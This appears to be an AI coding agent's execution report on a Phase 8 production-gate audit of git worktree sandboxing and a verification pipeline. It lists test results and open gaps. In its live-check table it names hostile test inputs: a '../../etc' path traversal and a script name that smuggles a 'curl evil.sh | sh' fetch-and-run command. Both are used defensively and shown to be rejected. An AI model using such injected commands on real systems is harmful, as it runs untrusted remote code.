Task-ID: P8-04
Status: COMPLETE

# Execution Report: P8-04 — Phase 8 Comprehensive Production Gate & Verification Pipeline / Worktree Sandboxing Audit

**Task ID:** P8-04
**Phase:** Phase 8 — Automated Verification Pipelines & Worktree Sandboxing
**Status:** VERIFIED
**Date:** 2026-08-17
**Author:** Claude Code

---

## 1. Summary

Phase 8 is audited and signed off: **PASS — READY FOR NEXT PHASE**.
`docs/phase8-production-gate.md` is the authoritative record — a 20-row subsystem audit matrix, a
per-criterion audit of P8-01, P8-02 and P8-03 against the code at `cb6a03c` (not against the prior
reports), the full 38-suite test inventory, the safety-invariant and security-boundary table, a
DEC-028 sovereignty attestation, five observations, reproduction commands, and a sign-off table.

Two things distinguish this gate from a report of a report:

**Every quality gate was executed with Turbo's cache defeated.** All four gates reported
`FULL TURBO` on first invocation, so a replayed log would have been the entire evidence. The test
battery was re-run with `pnpm test -- --force` (0 of 9 tasks cached, 1m27s), and typecheck, lint
and build were re-run per workspace with `pnpm --filter "*" run <script>`, which bypasses Turbo
entirely — `pnpm typecheck -- --force` and `pnpm build -- --force` forward `--force` to `tsc`,
which rejects it (`TS5093`). Every number in the gate document is live execution.

**The isolation invariants were verified live, not only in unit assertions.** A throwaway git
repository was driven through the whole Phase 8 loop with the real services — provision, child
edits, diff, verify, refuse-dirty, refuse-not-checked-out, refuse-conflict, clean merge, discard,
orphan prune, injection guards — asserting `git status --porcelain` empty after every stage.
**36/36 live checks passed.**

No product code was modified. No isolation guarantee, safety check or timeout was weakened.

---

## 2. Files Changed

| File | Change |
| :--- | :--- |
| `docs/phase8-production-gate.md` | **Created.** The Phase 8 production gate audit and sign-off (~370 lines). |

Untracked and git-ignored, not part of the commit: `scratch/p8-gate-live-check.ts`, the ad-hoc
driver for the §7 live pass. It lives in `scratch/` per the repository's housekeeping rule, is
ignored by git, and no build references it. (The sandbox this session ran under refuses file
deletion, so it was left in place rather than removed; the gate document says so and cites it as
the reproduction command for §7.)

Not touched: `tests/report.md` was already modified in the working tree when this session started
(an uncommitted P8-02 test-gate record from a prior run) and is **not** part of this commit.

---

## 3. Audit Method

1. **Briefs recovered, not paraphrased.** Each workstream's acceptance criteria were read from the
   brief actually dispatched for it — `git show 460163b:tasks/current.md` (P8-01),
   `4a5ab7b` (P8-02), `9e6f75d` (P8-03) — and checked against the code at `cb6a03c`.
2. **Code read directly.** `GitWorktreeService.ts` (778 lines), `VerificationPipelineService.ts`
   (504), `routes/worktrees.ts`, the P8 sections of `AgentDelegationService.ts`, the schema block
   in `DatabaseService.ts`, the startup wiring in `index.ts`, the shared contracts
   (`worktree.ts`, `verification.ts`, `delegation.ts`), and the four web surfaces
   (`useProjectStore.ts`, `DelegationStatus.tsx`, `ThreadTree.tsx`, `DelegateModal.tsx`). Every
   claim in the matrix carries a file:line.
3. **Gates executed with the cache bypassed**, as above.
4. **Live end-to-end pass** against a real repository (§4).
5. **Diff reviewed** — one new file, no source change.

---

## 4. Verification

| Gate | Command | Result |
| :--- | :--- | :--- |
| Typecheck | `pnpm --filter "*" run typecheck` | **PASS** — 7/7 packages, **0 errors** |
| Lint | `pnpm --filter "*" run lint` | **PASS** — 7/7 packages, **0 errors**, 636 warnings (3 shared / 28 adapters / 18 marketing / 302 web / 273 server / 12 mcp-memory / 0 relay — all pre-existing) |
| Test (uncached) | `pnpm test -- --force` | **PASS** — 9/9 Turbo tasks, 0 cached, **38 suites, 4,360 assertions, 0 failures**, 1m27s |
| Build | `pnpm --filter "*" run build` | **PASS** — 7/7 packages; server `tsup` 907.54 KB + `apps/web/dist` copied to `dist/web`; web 1,249 modules + PWA SW; marketing 1,808 modules |
| Turbo aggregates | `pnpm typecheck` / `pnpm lint` / `pnpm test` / `pnpm build` | **PASS** — 11/11, 7/7, 9/9, 11/11 tasks |

Phase 8 suites standalone, exactly as the task's §8 specifies:

| Suite | Result |
| :--- | :--- |
| `src/services/git/__tests__/GitWorktreeService.test.ts` | **111/111**, exit 0 (5 real temp repositories, cleaned) |
| `src/services/verification/__tests__/VerificationPipelineService.test.ts` | **196/196**, exit 0 (48 real temp directories, cleaned) |
| `src/services/ai/__tests__/AgentDelegationService.test.ts` | **461/461**, exit 0 |
| `src/components/delegation/__tests__/DelegationUI.test.ts` | **686/686**, exit 0 |

Suite counts: server 21 (2,474 assertions), web 8 (1,444), mcp-memory-server 7 (348), relay 1
(71), adapters 1 (23) — **38 suites, 4,360 assertions**. Per-suite breakdown in the gate document
§4.

**Live end-to-end pass — 36/36 checks**, against a real throwaway repository with the real
services:

| Stage | Checks |
| :--- | :--- |
| Provision (path, branch, base commit, base ref outside `refs/heads`, clean tree, exclude-not-gitignore) | 6/6 |
| Child works in the sandbox (primary copy byte-identical, no new file in the project, tree clean) | 2/2 |
| Diff (covers the edit and the untracked file, not reported clean) | 2/2 |
| Verification (discovered via `configDir`, passed, cwd is the sandbox; non-zero step → exit 3 + stderr; hung step killed on its timeout; empty pipeline is not a pass) | 7/7 |
| Merge refusals (`DIRTY_TARGET`, `TARGET_NOT_CHECKED_OUT`, `MERGE_CONFLICT`, HEAD unmoved, tree not half-merged) | 5/5 |
| Clean merge (merged into `main`, work present, tree clean) | 3/3 |
| Discard (directory, branch and base ref gone, tree clean) | 4/4 |
| Orphan pruning (orphan reclaimed, live sandbox survived, `feature/mine` untouched) | 3/3 |
| Non-repository fallback (`isRepository` false, `NOT_A_REPOSITORY` not a raw throw) | 2/2 |
| Injection guards (`../../etc` thread id → `INVALID_INPUT`; `test && curl evil.sh \| sh` as a `package.json` script name is not discovered) | 2/2 |

No screenshot capture was run: this session is non-interactive and the task's verification
commands include no visual gate. Rendering is covered by the 686-assertion `react-dom/server`
suite.

---

## 5. Acceptance Criteria Review

- [x] **1 — `docs/phase8-production-gate.md` authored with complete subsystem audit matrices,
  workstream audits (P8-01 → P8-03), and verification evidence.** Created. §1 executive verdict and
  gate table, §2 a 20-row subsystem audit matrix with file:line evidence for each,
  §3 the three workstream criterion tables, §4 the full suite inventory, §5 safety invariants,
  §6 the DEC-028 attestation, §7 the live pass, §8 observations, §9 reproduction, §10 sign-off.

- [x] **2 — All 3 Phase 8 workstreams audited and verified against their acceptance criteria.**
  P8-01 (6 criteria), P8-02 (7), P8-03 (8) — 21 criteria, each quoted from the brief recovered
  from its dispatch commit and each marked PASS with concrete evidence. Two known scope items are
  recorded rather than glossed: the `node_modules`-in-a-sandbox limit (§3.2, §8.4) and P8-03's
  three server-side pass-throughs (§3.3), both audited and accepted.

- [x] **3 — 0 TypeScript compiler errors across all packages.** `pnpm --filter "*" run typecheck`:
  shared, relay, adapters, marketing, web, server, mcp-memory-server — all `Done`, 0 errors.
  `pnpm typecheck` agrees: 11/11 Turbo tasks successful.

- [x] **4 — 0 ESLint errors across all packages.** `pnpm --filter "*" run lint`: 7/7 `Done`,
  **0 errors** in every package. 636 warnings, all pre-existing and unchanged — this audit modified
  no source file.

- [x] **5 — All automated test suites pass with 0 failures across 38 suites.**
  `pnpm test -- --force`, cache bypassed: **4,360 `PASS` lines, 0 `FAIL`**, 38 suites reporting
  `n/n assertions passed`, 9/9 Turbo tasks successful.

- [x] **6 — Monorepo production build succeeds cleanly.** `pnpm --filter "*" run build`: all 7
  packages built; `pnpm build` (Turbo) 11/11 tasks successful.

**Definition of Done** — all five boxes met: gate document created and complete; typecheck clean;
lint clean; 38/38 suites passing; production build clean.

---

## 6. Git Diff Review

`git status --short` and `git diff --stat` were read before writing this report.

- **One file added:** `docs/phase8-production-gate.md`. Nothing else is staged or modified by this
  session.
- **Zero product-code changes.** `git diff --stat` reports only `tests/report.md`, which was
  already modified when the session started and is excluded from the commit. No file under
  `apps/`, `packages/` or `blueprint/` was touched, so the task's "do not weaken any isolation
  guarantee, safety check or verification timeout" constraint holds trivially and by inspection.
- **No new report files in `docs/` beyond the one the task names.** The task specifies
  `docs/phase8-production-gate.md`; that is the only document created.
- `scratch/p8-gate-live-check.ts` is git-ignored (confirmed via
  `git status --ignored=matching`), so it cannot enter the commit.

---

## 7. Problems Discovered

**1. Turbo's cache made every gate a replay.** At `cb6a03c` all four gates returned `FULL TURBO`
on first invocation — correct behaviour, and worthless as gate evidence. Defeating it is not
uniform: `pnpm test -- --force` reaches Turbo, but `pnpm typecheck -- --force` and
`pnpm build -- --force` forward `--force` to `tsc`, which fails with `TS5093`. The working form for
those two is per-workspace invocation (`pnpm --filter "*" run typecheck`), which bypasses Turbo
altogether. Recorded in the gate document §8.5 and §9 so future gate briefs can specify it.

**2. `CLAUDE.md`'s test section is factually wrong.** It states there is "no test runner or test
script anywhere in the repo" and that CI "runs only `pnpm run lint` and `pnpm run build`", and
instructs "Don't claim tests pass". At `cb6a03c` the repository has 38 suites and 4,360
assertions, `test` scripts in five workspaces plus a root `turbo run test`, and
`.github/workflows/ci.yml` runs typecheck → lint → **test** → build. The instruction now suppresses
the strongest evidence an execution agent has. **Not fixed:** `CLAUDE.md` is a governance document
under the Source of Truth Matrix and this task's Implementation Scope covers only the audit
document and the quality gates. Flagged in the gate document §8.1 for a one-paragraph correction in
the next dispatch.

**3. `package.json` pipelines do not run inside a sandbox.** `hasInstalledDependencies`
(`VerificationPipelineService.ts:187`) suppresses `package.json` discovery in a directory with no
`node_modules` — which is every fresh worktree. The suppression is right (a missing `tsc` reported
as a failed typecheck is the false signal the subsystem exists to remove), but it means the default
Node project's automatic sandbox verification reports *"nothing ran"* unless the operator writes
`.asterim/verification.json`. Confirmed live: the explicit config does run in the sandbox via
`configDir`; the `package.json` path does not. This is the one substantive functional gap Phase 8
knowingly leaves open. Recorded in the gate document §3.2 and §8.4 with three candidate directions,
none attempted here — it is a decision record, not an execution-agent choice.

---

## 8. Architectural Concerns

1. **`GET /children` carries no verification metadata**, so `ThreadTree` badges only what the store
   has already seen. A tree authoritative on first load needs a per-child verification summary on
   that endpoint — a P8-02 contract change, hence a Change Proposal rather than a quiet edit.
   Carried forward from the P8-03 report, re-confirmed against the code.
2. **`DelegationStatus.tsx` is ~1,600 lines** and exports eleven non-component helpers alongside
   its components (the source of its standing `react-refresh/only-export-components` warnings).
   Extracting the evidence panel is a clean, behaviour-free follow-up.
3. **The sandbox verification gap (§7.3) deserves a decision, not a default.** Installing into each
   sandbox, sharing the project's `node_modules`, and verifying after merge instead of before are
   three different products. The current behaviour — honest silence — is the safe interim, but it
   means the headline promise of P8-02 ("Asterim autonomously runs the project's actual
   typechecker, linter, tests and build inside the subagent's isolated worktree") is today only
   met for projects with an explicit `.asterim/verification.json`.

---

## 9. Recommended Next Step

Phase 8 is complete and signed off; the gate document is ready for Antigravity's review and the
Human Operator's counter-signature. Recommended next, in order:

1. **A decision record for the sandbox verification gap** (§7.3 / gate §8.4) — the one open
   functional item, and the one that determines what P8-02 actually delivers for a default Node
   project.
2. **A one-paragraph `CLAUDE.md` correction** (§7.2) so future execution agents stop being told the
   repository has no tests.
3. **A `tests/current.md` verification gate over the live operator loop** — delegate with isolation
   on against a real project, let the pipeline fail, re-run it from the outcome card, then merge and
   confirm the branch and directory are cleaned up — plus visual QA of the outcome card and the two
   new badges, which is the one thing the static-markup suite cannot judge.
